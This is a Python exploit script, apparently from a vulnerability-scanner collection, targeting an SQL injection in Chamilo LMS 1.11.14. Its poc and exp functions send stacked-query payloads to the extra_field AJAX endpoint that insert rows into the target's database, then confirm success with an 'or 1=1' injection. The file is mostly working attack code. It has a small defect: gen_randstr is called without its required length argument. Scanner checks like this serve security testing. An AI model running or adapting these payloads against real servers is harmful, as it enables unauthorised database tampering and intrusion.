import requests
import random
import string


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Chamilo LMS SQL Injection''',
        "description": '''Finds sql injection in Chamilo version 1.11.14''',
        "severity": "high",
        "references": [
            ""
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["chamilo", "sqli"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr()
    try:
        url = format_url(url)

        path = """/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags"""
        method = "POST"
        data = """type=image&field_id=image&tag=image&from=image&search=image&options=["test'); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,'{randstr}'); INSERT INTO extra_field_options(option_value) VALUES ('{randstr}'); INSERT INTO tag (id, tag, field_id,count) VALUES(16, '{randstr}', 16,0) ON DUPLICATE KEY UPDATE     tag='{randstr}', field_id=16, count=0;  -- "]""".format(randstr=randstr)
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags"""
        method = "POST"
        data = """type=image&field_id=image&tag=image&from=image&search=image&options=["test') or 1=1 -- "]"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if randstr in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))